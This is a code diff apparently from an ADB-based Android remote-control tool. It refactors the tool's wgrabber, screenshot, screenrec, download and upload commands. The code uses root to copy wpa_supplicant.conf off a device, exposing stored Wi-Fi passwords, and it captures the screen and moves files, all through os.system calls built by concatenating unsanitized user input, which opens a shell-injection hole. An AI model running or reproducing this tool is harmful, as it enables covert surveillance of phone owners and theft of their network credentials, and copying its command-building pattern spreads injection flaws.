@@ -197,8 +197,6 @@ def main():
                         if len(con.split()) < 2:
                             print("Usage: wgrabber <local_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
                             if os.path.isdir(con.split()[1]):
                                 if os.path.exists(con.split()[1]):
                                     rp = os.path.split(con.split()[1])[1]
@@ -213,23 +211,22 @@ def main():
                             else:
                                 rp = os.path.split(con.split()[1])[0]
                                 if os.path.exists(rp):
-                                    rp = os.path.split(con.split()[1])[1]
-                                    print(G+"Grabbing WPA Supplicant...")
-                                    os.system("adb shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/' > /dev/null")
-                                    os.system("adb pull /sdcard/wpa_supplicant.conf "+con.split()[1])
-                                    print(G+"Saving wpa_supplicant.conf...")
-                                    time.sleep(1)
-                                    print(S+"Saved to "+con.split()[1]+"!")
+                                    if os.path.isdir(rp):
+                                        rp = os.path.split(con.split()[1])[1]
+                                        print(G+"Grabbing WPA Supplicant...")
+                                        os.system("adb shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/' > /dev/null")
+                                        os.system("adb pull /sdcard/wpa_supplicant.conf "+con.split()[1])
+                                        print(G+"Saving wpa_supplicant.conf...")
+                                        time.sleep(1)
+                                        print(S+"Saved to "+con.split()[1]+"!")
+                                    else:
+                                        print(E+"Error: "+rp+": not a directory!")
                                 else:
                                     print(E+"Local directory: "+rp+": does not exists!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     elif con[:10] == "screenshot":
                         if len(con.split()) < 2:
                             print("Usage: screenshot <local_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
                             if os.path.isdir(con.split()[1]):
                                 if os.path.exists(con.split()[1]):
                                     print(G+"Taking screenshot...")
@@ -243,23 +240,22 @@ def main():
                             else:
                                 rp = os.path.split(con.split()[1])[0]
                                 if os.path.exists(rp):
-                                    rp = os.path.split(con.split()[1])[1]
-                                    print(G+"Taking screenshot...")
-                                    os.system("adb shell screencap /sdcard/screen.png > /dev/null")
-                                    os.system("adb pull /sdcard/screen.png "+con.split()[1]+" > /dev/null")
-                                    print(G+"Saving to "+con.split()[1]+"...")
-                                    time.sleep(1)
-                                    print(S+"Saved to "+con.split()[1]+"!")
+                                    if os.path.isdir(rp):
+                                        rp = os.path.split(con.split()[1])[1]
+                                        print(G+"Taking screenshot...")
+                                        os.system("adb shell screencap /sdcard/screen.png > /dev/null")
+                                        os.system("adb pull /sdcard/screen.png "+con.split()[1]+" > /dev/null")
+                                        print(G+"Saving to "+con.split()[1]+"...")
+                                        time.sleep(1)
+                                        print(S+"Saved to "+con.split()[1]+"!")
+                                    else:
+                                        print(E+"Error: "+rp+": not a directory!")
                                 else:
                                     print(E+"Local directory: "+rp+": does not exists!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     elif con[:9] == "screenrec":
                         if len(con.split()) < 2:
                             print("Usage: screenrec <local_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
                             if os.path.isdir(con.split()[1]):
                                 if os.path.exists(con.split()[1]):
                                     print(G+"Recording screen...")
@@ -274,18 +270,19 @@ def main():
                             else:
                                 rp = os.path.split(con.split()[1])[0]
                                 if os.path.exists(rp):
-                                    rp = os.path.split(con.split()[1])[1]
-                                    print(G+"Recording screen...")
-                                    print(G+"Press Ctrl-C to stop.")
-                                    os.system("adb shell screenrecord /sdcard/screen.mp4 > /dev/null")
-                                    os.system("adb pull /sdcard/screen.mp4 "+con.split()[1]+" > /dev/null")
-                                    print(G+"Saving to "+con.split()[1]+"...")
-                                    time.sleep(1)
-                                    print(S+"Saved to "+con.split()[1]+"!")
+                                    if os.path.isdir(rp):
+                                        rp = os.path.split(con.split()[1])[1]
+                                        print(G+"Recording screen...")
+                                        print(G+"Press Ctrl-C to stop.")
+                                        os.system("adb shell screenrecord /sdcard/screen.mp4 > /dev/null")
+                                        os.system("adb pull /sdcard/screen.mp4 "+con.split()[1]+" > /dev/null")
+                                        print(G+"Saving to "+con.split()[1]+"...")
+                                        time.sleep(1)
+                                        print(S+"Saved to "+con.split()[1]+"!")
+                                    else:
+                                        print(E+"Error: "+rp+": not a directory!")
                                 else:
                                     print(E+"Local directory: "+rp+": does not exists!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     elif con[:9] == "uninstall":
                         if con[10:] == "":
                             print("Usage: uninstall <application>")
@@ -338,8 +335,6 @@ def main():
                         if len(con.split()) < 3:
                             print("Usage: download <remote_path> <local_path>")
                         else:
-                            w = os.environ['OLDPWD']
-                            os.chdir(w)
                             if os.path.isdir(con.split()[2]):
                                 if os.path.exists(con.split()[2]):
                                     rp = os.path.split(con.split()[1])[1]
@@ -349,13 +344,14 @@ def main():
                             else:
                                 rp = os.path.split(con.split()[2])[0]
                                 if os.path.exists(rp):
-                                    rp = os.path.split(con.split()[2])[1]
-                                    pr = os.path.split(con.split()[1])[1]
-                                    os.system("chmod +x data/payloads/download && data/payloads/download "+con.split()[1]+" "+con.split()[2]+" "+rp+" "+pr)
+                                    if os.path.isdir(rp):
+                                        rp = os.path.split(con.split()[2])[1]
+                                        pr = os.path.split(con.split()[1])[1]
+                                        os.system("chmod +x data/payloads/download && data/payloads/download "+con.split()[1]+" "+con.split()[2]+" "+rp+" "+pr)
+                                    else:
+                                        print(E+"Error: "+rp+": not a directory!")
                                 else:
                                     print(E+"Local directory: "+rp+": does not exists!")
-                            g = os.environ['HOME']
-                            os.chdir(g + "/ghost")
                     elif con[:6] == "upload":
                         if len(con.split()) < 2:
                             print("Usage: upload <local_path> <remote_path>")
@@ -363,15 +359,16 @@ def main():
                             if len(con.split()) < 3:
                                 print("Usage: upload <local_path> <remote_path>")
                             else:
-                                w = os.environ['OLDPWD']
-                                os.chdir(w)
                                 if os.path.exists(con.split()[1]):
-                                    rp = con.split()[2][::-1]
-                                    rp = rp[rp.index('/')+1:][::-1]
-                                    pr = os.path.split(con.split()[2])[0]
-                                    lrp = con.split()[1][::-1]
-                                    lrp = lrp[lrp.index('/')+1:][::-1]
-                                    os.system("chmod +x ~/ghost/data/payloads/upload && ~/ghost/data/payloads/upload "+con.split()[1]+" "+con.split()[2]+" "+rp+" "+pr+" "+lrp)
+                                    if os.path.isdir(con.split()[1]):
+                                        print(E+"Error: "+rp+": not a file!")
+                                    else:
+                                        rp = con.split()[2][::-1]
+                                        rp = rp[rp.index('/')+1:][::-1]
+                                        pr = os.path.split(con.split()[2])[0]
+                                        lrp = con.split()[1][::-1]
+                                        lrp = lrp[lrp.index('/')+1:][::-1]
+                                        os.system("chmod +x data/payloads/upload && data/payloads/upload "+con.split()[1]+" "+con.split()[2]+" "+rp+" "+pr+" "+lrp)
                                 else:
                                     print(E+"Local file: "+con.split()[1]+": does not exist!")
                                 g = os.environ['HOME']
